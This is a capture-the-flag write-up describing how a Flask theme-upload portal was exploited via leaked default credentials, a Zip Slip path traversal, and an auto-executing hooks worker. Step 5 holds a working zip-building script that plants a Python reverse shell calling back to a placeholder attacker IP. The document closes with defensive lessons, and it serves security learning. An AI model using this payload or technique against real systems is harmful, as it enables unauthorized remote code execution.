# Day - 10

---

**Challenge name:** The Hollow Shell

**Category:** Web / Zip Slip

**Difficulty:** Medium

**Date completed:** 5th of August 2026

---

## Summary

Byte Lotus is a Flask/Gunicorn "shoreline display" portal that lets staff upload themed `.zip` "shells" to set ambiance on in-room tablets. The upload endpoint validated the *declared* asset list inside `shell.json`, but never sanitized the actual path names of entries inside the zip itself, and extracted every entry with a raw `os.path.join(shell_dir, name)` - a textbook Zip Slip. Escaping the per-upload extraction folder with `../` sequences let files be written anywhere on disk the app process could reach, including the app's own `hooks/` directory. A background `theme_worker.py` process polls that directory every 20 seconds and feeds any `.py` file it finds straight into `python3 -` via stdin - no manifest key, no validation, just "any script that shows up gets run." Dropping a reverse shell into `hooks/` via the zip-slip write gave full code execution as `roomservice`, and the flag was sitting directly in the working directory.

---

### Step 1: Recon

```bash
nmap -sCV 10.48.158.161
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
5000/tcp open  http    Gunicorn
| http-title: Byte Lotus - Room Service
|_Requested resource was /login
```

Root redirects straight to `/login`.

---

### Step 2: Leaked staff credentials

View-source on `/login` contained an HTML comment with seeded default staff creds:

```html
<!--
  Byte Lotus // internal display-manager portal
  New on the floor team? IT seeds every property with the same
  starter login until you set your own:
    user: concierge
    pass: StayNoticed2024!
  (rotate it from Settings on first sign-in - most people forget)
-->
```

Logged in as `concierge` / `StayNoticed2024!` and landed on `/dashboard`, which exposes a "Bring a shell ashore" upload form. Each shell is a `.zip` containing a `shell.json` manifest listing its `assets` (images, stylesheets), with allowed types `png jpg gif svg css json`. The UI also mentions optional "automation hooks" applied by a "theme worker" shortly after upload - the eventual RCE vector.

---

### Step 3: Confirming the manifest/content disconnect

A minimal shell (`{"name": "test-shell", "assets": []}`) uploaded fine and extracted to a web-accessible `shells/<id>/` path. Adding a second, path-traversal-named zip entry but *also* declaring it in `assets` got rejected:

```
Shell rejected: asset type not allowed: canary.txt
```

This confirmed the extension allow-list only checks names **declared inside `shell.json`'s `assets` array** - it never cross-checks that list against the zip's real entries. Leaving `assets` empty (`[]`) while smuggling undeclared entries bypassed validation entirely.

---

### Step 4: Mapping the traversal depth

Rather than guess blindly, isolated single-depth canary files were built with Python's `zipfile` (one `../` sequence per test, unique destination filenames) and uploaded one at a time, checking reachable static paths after each:

```python
import json, zipfile
manifest = {"name": "depth-probe", "assets": []}
with zipfile.ZipFile("probe_d1_static.zip", "w", zipfile.ZIP_DEFLATED) as z:
    z.writestr("shell.json", json.dumps(manifest))
    z.writestr("../static/probe_d1.txt", "depth1 probe -> shells/static/\n")
```

Results:

- `../` (depth 1) → lands in `shells/` itself (confirmed by a stray `shells/static/` entry showing up in the dashboard's shell listing, and directly readable at `/shells/static/probe_d1.txt`)
- `../../` (depth 2) → lands in the **app root**, and critically `../../static/probe_d2.txt` was readable at `/static/probe_d2.txt` - proving Flask's real static folder was reachable
- `../../../` (depth 3) → **500 Internal Server Error**, consistent with the write landing somewhere invalid above the app root

---

### Step 5: Weaponizing the write into RCE

With depth 2 confirmed as the app root, a Python script was zip-slipped straight into `hooks/`:

```python
import zipfile, json

manifest = {"name": "reverse", "assets": []}

callback = '''
import socket, os, pty
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("<ATTACKER_IP>", 4444))
for fd in (0, 1, 2):
    os.dup2(sock.fileno(), fd)
pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("reverse_shell.zip", "w") as z:
    z.writestr("shell.json", json.dumps(manifest))
    z.writestr("../../hooks/callback.py", callback)
```

A listener was started (`nc -lvnp 4444`), the zip uploaded through the dashboard, and within the worker's ~20s poll window a connection came back:

```
roomservice@tryhackme-2404:/var/www/conch$
```

Full code execution as `roomservice`.

---

### Step 6: Finding the flag

The flag was sitting directly in the `roomservice` working directory, no further privesc needed:

```
THM{REDACTED}
```

---

## Why this worked

Two independent weaknesses chained together. First, the manifest-based asset validation only ever inspected the *declared* `assets` list in `shell.json` - it had no idea what was actually inside the zip, so undeclared entries sailed through untouched. Second, and more fundamentally, `extract_shell()` joined each zip entry's raw name onto the target directory with no path sanitization at all, so any entry containing `../` sequences could write outside the intended `shells/<id>/` sandbox. Neither bug alone was fatal - the manifest check alone just meant unlisted files could be smuggled in, and the unsanitized extraction alone would "only" be an arbitrary-write-within-the-app-directory bug. What turned it into full RCE was a third, unrelated feature: an always-on background worker that treats the mere *presence* of a `.py` file in `hooks/` as implicit permission to execute it, with no authentication, no manifest opt-in, and no validation of where that file came from. Any code path capable of writing a file into that directory - zip slip or otherwise - is equivalent to full remote code execution.

---

## Lessons Learned

- Validate the *actual* contents of an archive, not just a declared manifest describing what it's supposed to contain. A metadata allow-list is only as strong as the guarantee that the metadata matches reality.
- Never build custom zip extraction with raw `os.path.join(base, entry_name)`. Sanitize every entry name (strip `..`/absolute components, or resolve and verify the final path is still inside the target directory) before writing, or use a library/version that already guards against this.
- Don't design "automation" that treats file presence as an execution trigger. A background poller that runs *any* script dropped into a watched directory is RCE-as-a-feature - execution should require an authenticated, explicit action, not incidental placement.
- Isolate unknowns methodically. Testing traversal depth one level at a time with unique canary files (rather than guessing multi-level paths blind) turned a vague "zip slip probably works" into a precisely confirmed depth-to-directory mapping before ever attempting weaponization.
- Least privilege for background workers matters too - a poller with write/execute reach into the app's own source tree is a large blast radius for what's meant to be a cosmetic "theme" feature.
